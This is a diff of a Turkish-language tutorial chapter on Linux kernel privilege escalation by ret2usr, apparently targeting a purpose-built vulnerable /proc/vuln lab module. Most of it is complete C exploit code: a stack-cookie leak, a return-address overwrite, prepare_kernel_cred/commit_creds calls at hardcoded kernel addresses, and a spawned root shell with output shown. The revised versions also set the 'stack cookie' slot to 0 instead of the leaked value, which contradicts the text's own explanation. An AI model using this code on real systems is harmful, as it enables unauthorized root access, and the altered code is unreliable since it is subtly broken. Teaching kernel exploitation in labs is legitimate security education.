@@ -14,14 +14,17 @@ return-to-user, kerneli user-space'de olan bir adrese döndürüyoruz.
 
 Hadi bunu bir örnek ile görelim:
 ```c
-#include <stdlib.h>
-#include <stdio.h>
 #include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
 #include <fcntl.h>
 
-#define DEVICE      "/proc/vuln"
+#define DEVICE "/proc/vuln"
 
-void call_cant_get_here(){
+void call_cant_get_here()
+{
+
     // burda doğrudan assembly çalıştıracağız
     // unutmayın bu kod kernelde çalışcak, bu fonksiyona 
     // user-space'de olan çağrılar ekleyemeyiz
@@ -44,13 +47,19 @@ void call_cant_get_here(){
     ".att_syntax;"
 
     );
+
 }
 
-int main(){
+int main()
+{
+
     int fd = open(DEVICE, O_RDWR);
 
     unsigned long w[3];
     unsigned long r[5];
+
+    bzero(w, sizeof(w));
+    bzero(r, sizeof(r));
     
     read(fd, r, sizeof(r));
     for(int i = 0; i < sizeof(r)/8; i++){
@@ -60,11 +69,15 @@ int main(){
 
     w[0] = 0; // local buffer 
     w[1] = r[4]; // stack cookie
+
+    // burdaki adresi local fonksiyonun adresi ile değiştirdik
     w[2] = (unsigned long)call_cant_get_here; // return address 
 
     puts("Writing payload to "DEVICE);
     write(fd, w, sizeof(w));
+
     close(fd);
+
 }
 ```
 Bu az önceki exploitimizin ret2usr metodu ile yazılmış hali. Kernel `call_cant_get_here` user-space
@@ -75,9 +88,12 @@ Aslında bunu assembly kullanmadan da yapabiliriz:
 ```c
 typedef void* (*cant_get_here)(void);
 
-void call_cant_get_here(){
+void call_cant_get_here()
+{
+
     cant_get_here func = (void*)0xffffffffc00001d6;
     func();
+
 }
 ```
 Ancak az sonraki root exploitimiz için adresi ile çağırdımız fonksiyonlara bazı 
@@ -171,15 +187,18 @@ ile geçeceğiz, ardından `prepare_kernel_cred`in dönüş değerini `rax`dan o
 
 O halde koda geçelim:
 ```c
-#include <stdlib.h>
-#include <stdio.h>
 #include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
 #include <fcntl.h>
 
-#define DEVICE      "/proc/vuln"
+#define DEVICE "/proc/vuln"
 
-void root(void){
-  __asm__(
+void root(void)
+{
+
+    __asm__(
     ".intel_syntax noprefix;"
     
     // prepare_kernel_cred'in adresini önceki gibi rax'a taşıyoruz
@@ -204,35 +223,46 @@ void root(void){
     "call rax;"
     
     ".att_syntax;"
-  );
+    );
+
 }
 
-int main(){
+int main()
+{
+
     int fd = open(DEVICE, O_RDWR);
+
     unsigned long w[3];
     unsigned long r[5];
 
+    bzero(w, sizeof(w));
+    bzero(r, sizeof(r));
+    
     read(fd, r, sizeof(r));
     for(int i = 0; i < sizeof(r)/8; i++){
         printf("Reading (%d): %lx\n", i, r[i]);
     }
     printf("Cookie leaked! %lx\n", r[4]);
 
-    w[1] = r[4];
-    w[2] = (unsigned long)&root;
+    w[0] = 0; // local buffer 
+    w[1] = 0; // stack cookie 
+
+    // burdaki adresi bu sefer root fonksiyonun adresi ile değiştirdik
+    w[2] = (unsigned long)root; // return address 
+
     puts("Writing payload to "DEVICE);
     write(fd, w, sizeof(w));
+
     close(fd);
-    return 0;
+
 }
 ```
 Hadi exploitimizi test etmek adına sistemde root olmayan yeni bir kullanıcı oluşturup derlediğimiz 
 exploiti bu kullanıcı olarak çalıtştıralım:
 ```
-useradd user
-mkdir -p /home/user
+useradd -m user
 cp exploit /home/user/exploit 
-chown -R user:user /home/user
+chown user:user /home/user/exploit
 su user
 ```
 Bu yeni kullanıcı olarak ev dizinimizde exploiti çalıştırırsak... hiçbirşey olmayacak. Exploit 
@@ -242,52 +272,63 @@ bu işlem de bizim exploitimiz. Exploitimiz çalıştıktan sonra sorunsuzca roo
 herhangi bir şekilde kullanmadan exploitimiz sonlanıyor. Exploitimizi gerçekten de kullanılabilir 
 yapmak adına en son bir shell çalıştırabiliriz:
 ```c
-#include <stdlib.h>
-#include <stdio.h>
 #include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
 #include <fcntl.h>
 
 // en son çalıştıracağımız komut
 // sh shellini çalıştırıyor olacağız
-#define CMD         "/bin/sh"
+#define CMD    "/bin/sh"
 
-#define DEVICE      "/proc/vuln"
+#define DEVICE "/proc/vuln"
 
-void root(void){
-  __asm__(
-  ".intel_syntax noprefix;"
-  "movabs rax, 0xffffffff81094a50;" //prepare_kernel_cred
-  "xor rdi, rdi;"
-  "call rax; mov rdi, rax;"
-  "movabs rax, 0xffffffff810947b0;" //commit_creds
-  "call rax;"
-  ".att_syntax;"
-  );
+void root(void)
+{
+
+    __asm__(
+    ".intel_syntax noprefix;"
+    "movabs rax, 0xffffffff81094a50;" //prepare_kernel_cred
+    "xor rdi, rdi;"
+    "call rax; mov rdi, rax;"
+    "movabs rax, 0xffffffff810947b0;" //commit_creds
+    "call rax;"
+    ".att_syntax;"
+    );
+
 }
 
-int main(){
-  int fd = open(DEVICE, O_RDWR);
-  unsigned long w[3];
-  unsigned long r[5];
+int main()
+{
 
-  read(fd, r, sizeof(r));
-  for(int i = 0; i < sizeof(r)/8; i++){
-    printf("Reading (%d): %lx\n", i, r[i]);
-  }
-  printf("Cookie leaked! %lx\n", r[4]);
+    int fd = open(DEVICE, O_RDWR);
 
-  w[1] = r[4];
-  w[2] = (unsigned long)&root;
-  puts("Writing the payload to "DEVICE);
-  write(fd, w, sizeof(w));
-  close(fd);
+    unsigned long w[3];
+    unsigned long r[5];
 
-  // bu noktada payloadımızı yazıp root aldığımıza göre 
-  // komutu çalıştırabiliriz
-  puts("Running the command");
-  system(CMD);
+    bzero(w, sizeof(w));
+    bzero(r, sizeof(r));
+    
+    read(fd, r, sizeof(r));
+    for(int i = 0; i < sizeof(r)/8; i++){
+        printf("Reading (%d): %lx\n", i, r[i]);
+    }
+    printf("Cookie leaked! %lx\n", r[4]);
 
-  return 0;
+    w[0] = 0; // local buffer 
+    w[1] = 0; // stack cookie 
+    w[2] = (unsigned long)root; // return address 
+
+    puts("Writing payload to "DEVICE);
+    write(fd, w, sizeof(w));
+    close(fd);
+
+    // bu noktada payloadımızı yazıp root aldığımıza göre 
+    // komutu çalıştırabiliriz
+    puts("Running the command");
+    system(CMD);
+
 }
 ```
 Eğer oluşturduğumuz `user` kullanıcısı olarak bu yeni exploiti çalıştırırsak:
@@ -305,7 +346,9 @@ sh-5.1# id
 uid=0(root) gid=0(root) groups=0(root)
 sh-5.1#
 ```
-root shellimizi elde ediyoruz. 
+root shellimizi elde ediyoruz.
+
+Bu exploit'in biraz daha süslü halini [src/exploit/](/src/exploit) dizini altında bulabilirsiniz.
 
 ---
 [Önceki](first.md) | [Son söz](end.md)
